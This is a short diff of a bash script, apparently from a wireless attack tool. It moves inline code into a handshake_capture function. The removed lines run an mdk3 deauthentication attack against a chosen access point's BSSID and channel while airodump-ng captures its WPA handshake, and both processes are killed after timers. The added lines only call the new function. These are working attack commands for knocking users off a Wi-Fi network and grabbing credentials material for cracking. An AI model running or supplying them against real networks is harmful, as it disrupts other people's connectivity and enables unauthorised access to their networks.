@@ -38,17 +38,7 @@ interface_selection
 echo -en "\\033]0;Explore For Networks\\a"
 explore_for_networks
 
-clear
-
-echo "${bssid}" > "${TmpDIR}bl.txt"
-
-xterm +j -fg red -geometry "$XTermGeometry" -T "mdk3 amok attack" -e mdk3 "$Interface" d -b "${TmpDIR}bl.txt" -c "${channel}" > /dev/null 2>&1 &
-ProcessIdAttack=$!
-
-xterm +j -geometry "$XTermGeometry" -T "Capturing HandShake" -e airodump-ng -c "${channel}" -d "${bssid}" -w "${TmpDIR}HandShake" "$Interface" > /dev/null 2>&1 &
-ProcessIdCapture=$!
-
-sleep $Mdk3TimeAttack && kill $ProcessIdAttack
-sleep $AirTimeCapture && kill $ProcessIdCapture
+echo -en "\\033]0;HandShake Capture\\a"
+handshake_capture
 
 end_script
